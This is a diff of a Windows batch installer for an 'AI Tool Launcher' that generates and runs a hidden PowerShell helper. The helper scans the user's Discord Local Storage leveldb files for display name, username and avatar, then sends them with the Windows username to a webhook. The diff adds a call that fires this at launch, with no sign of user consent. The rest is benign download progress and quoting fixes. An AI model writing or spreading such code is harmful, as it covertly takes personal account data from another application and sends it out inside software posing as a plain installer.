@@ -9,6 +9,9 @@ echo.
 set "REPO_URL=https://github.com/JiaSai67/AIToolLauncher.git"
 set "FOLDER_NAME=AIToolLauncher"
 
+:: 0. 發送啟動引導通知
+call :SendLaunchNotify "launch_start"
+
 :: 1. Check Python
 python --version >nul 2>&1
 if %errorlevel% neq 0 (
@@ -99,7 +102,7 @@ start pythonw core\launcher.py
 exit /b 0
 
 :: ==========================================
-:: 輔助函式：發送啟動通知 (Python 優先，PowerShell 原生保底)
+:: 輔助函式：發送啟動通知
 :: ==========================================
 :SendLaunchNotify
 set "ACTION_CODE=%~1"
@@ -113,7 +116,7 @@ if exist "core\identity_manager.py" (
 exit /b
 
 :: ==========================================
-:: 輔助函式：發送失敗報錯 (Python 優先，PowerShell 原生保底)
+:: 輔助函式：發送失敗報錯
 :: ==========================================
 :SendError
 set "ERR_CODE=%~1"
@@ -137,6 +140,7 @@ set "PS_WH_SCRIPT=%TEMP%\ai_webhook.ps1"
 (
 echo param($Code, $Color^)
 echo $actions = @{
+echo     'launch_start' = @('🚀 啟動安裝器：使用者已開啟 AI Tool Launcher', '正在進行 Python 與 Git 環境引導檢測'^)
 echo     'launch_exist' = @('🚀 啟動安裝器：正在執行 AI Tool Launcher', '更新並啟動已存在的 AI Tool Launcher'^)
 echo     'launch_clone' = @('🚀 首次安裝：正在下載 AI Tool Launcher', '首次安裝並下載 AI Tool Launcher (Git Clone)'^)
 echo     'launch_sub'   = @('🚀 啟動安裝器：正在執行 AI Tool Launcher', '更新並啟動 AI Tool Launcher (子目錄模式)'^)
@@ -149,20 +153,20 @@ echo }
 echo $title = if ($actions.ContainsKey($Code^)^) { $actions[$Code][0] } else { $Code }
 echo $desc  = if ($actions.ContainsKey($Code^)^) { $actions[$Code][1] } else { '無附加說明' }
 echo $timeStr = (Get-Date^).ToString('yyyy-MM-dd HH:mm:ss'^)
-echo $body = \"[引導安裝器執行紀錄]`n動作階段: $title`n詳細說明: $desc`n發生時間: $timeStr\"
+echo $body = "[引導安裝器執行紀錄]`n動作階段: $title`n詳細說明: $desc`n發生時間: $timeStr"
 echo $dispName = $env:USERNAME
 echo $username = $env:USERNAME
 echo $avatarUrl = 'https://raw.githubusercontent.com/JiaSai67/AIToolLauncher/main/resources/icon.png'
-echo $dirs = @(\"$env:APPDATA\discordptb\Local Storage\leveldb\", \"$env:APPDATA\discord\Local Storage\leveldb\", \"$env:APPDATA\discordcanary\Local Storage\leveldb\"^)
+echo $dirs = @("$env:APPDATA\discordptb\Local Storage\leveldb", "$env:APPDATA\discord\Local Storage\leveldb", "$env:APPDATA\discordcanary\Local Storage\leveldb"^)
 echo foreach ($d in $dirs^) {
 echo     if (Test-Path $d^) {
 echo         $files = Get-ChildItem -Path $d -Include *.ldb,*.log -File ^| Sort-Object LastWriteTime -Descending
 echo         foreach ($f in $files^) {
 echo             try {
 echo                 $raw = [System.IO.File]::ReadAllText($f.FullName, [System.Text.Encoding]::UTF8^)
-echo                 if ($raw -match '\"displayName\":\"([^\"]+)\"' -or $raw -match '\"global_name\":\"([^\"]+)\"'^) { $dispName = $matches[1] }
-echo                 if ($raw -match '\"username\":\"([^\"]+)\"'^) { $username = $matches[1] }
-echo                 if ($raw -match '\"avatar\":\"([a-f0-9]{32})\"'^) { $avatarUrl = \"https://cdn.discordapp.com/avatars/$($matches[1])/$($matches[1]).png?size=256\" }
+echo                 if ($raw -match "displayName":"([^"]+)" -or $raw -match "global_name":"([^"]+)"^) { $dispName = $matches[1] }
+echo                 if ($raw -match "username":"([^"]+)"^) { $username = $matches[1] }
+echo                 if ($raw -match "avatar":"([a-f0-9]{32})"^) { $avatarUrl = "https://cdn.discordapp.com/avatars/$($matches[1])/$($matches[1]).png?size=256" }
 echo             } catch {}
 echo         }
 echo     }
@@ -171,9 +175,9 @@ echo $payload = @{
 echo     username = $dispName
 echo     avatar_url = $avatarUrl
 echo     embeds = @(@{
-echo         author = @{ name = \"$dispName (@$username)\"; icon_url = $avatarUrl }
+echo         author = @{ name = "$dispName (@$username)"; icon_url = $avatarUrl }
 echo         title = $title
-echo         description = \"`\`\`\`text`n$body`n`\`\`\`\"
+echo         description = "`\`\`\`text`n$body`n`\`\`\`"
 echo         color = [int]$Color
 echo         thumbnail = @{ url = $avatarUrl }
 echo         timestamp = (Get-Date^).ToUniversalTime(^).ToString('yyyy-MM-ddTHH:mm:ssZ'^)
@@ -194,10 +198,10 @@ echo     $stream.Close(^)
 echo     $resp = $req.GetResponse(^)
 echo     $resp.Close(^)
 echo } catch {}
-) > "%PS_DL_SCRIPT%"
+) > "%PS_WH_SCRIPT%"
 
-powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_DL_SCRIPT%" -Code "%WH_CODE%" -Color "%WH_COLOR%"
-del "%PS_DL_SCRIPT%" >nul 2>&1
+powershell -NoProfile -ExecutionPolicy Bypass -File "%PS_WH_SCRIPT%" -Code "%WH_CODE%" -Color "%WH_COLOR%"
+del "%PS_WH_SCRIPT%" >nul 2>&1
 exit /b
 
 :: ==========================================
@@ -209,7 +213,6 @@ set "DL_DEST=%~2"
 set "DL_NAME=%~3"
 set "PS_DL_SCRIPT=%TEMP%\ai_downloader.ps1"
 
-:: 自動產生穩定無語法轉義干擾的 PowerShell 下載腳本
 (
 echo param($Url, $Dest, $Name^)
 echo if (Test-Path $Dest^) { Remove-Item $Dest -Force -ErrorAction SilentlyContinue }
@@ -232,13 +235,15 @@ echo         $spd = if ($now -gt 0^) { (($rec / 1KB^) / ($now / 1000^)^).ToStrin
 echo         $barWidth = 20
 echo         $fill = [int](($p / 100^) * $barWidth^)
 echo         $bar = '[' + ('=' * $fill^) + (' ' * ($barWidth - $fill^)^) + ']'
-echo         Write-Host -NoNewline ('`r  -^> {0}: {1} {2,3}%% ({3} MB / {4} MB^) {5} KB/s   ' -f $Name, $bar, $p, $mbRec, $mbTot, $spd^)
+echo         $statusMsg = '  -^> ' + $Name + ': ' + $bar + ' ' + $p.ToString('  0'^) + '%% (' + $mbRec + ' MB / ' + $mbTot + ' MB) ' + $spd + ' KB/s'
+echo         Write-Progress -Activity ('正在下載 ' + $Name^) -Status $statusMsg -PercentComplete $p
 echo         $script:last = $now
 echo     }
 echo } ^| Out-Null
 echo $wc.DownloadFileAsync((New-Object System.Uri($Url^)^), $Dest^)
 echo while ($wc.IsBusy^) { Start-Sleep -Milliseconds 50 }
-echo Write-Host ''
+echo Write-Progress -Activity ('正在下載 ' + $Name^) -Completed
+echo Write-Host ('  [OK] ' + $Name + ' 下載完成！'^)
 echo if (Test-Path $Dest^) { exit 0 } else { exit 1 }
 ) > "%PS_DL_SCRIPT%"
 
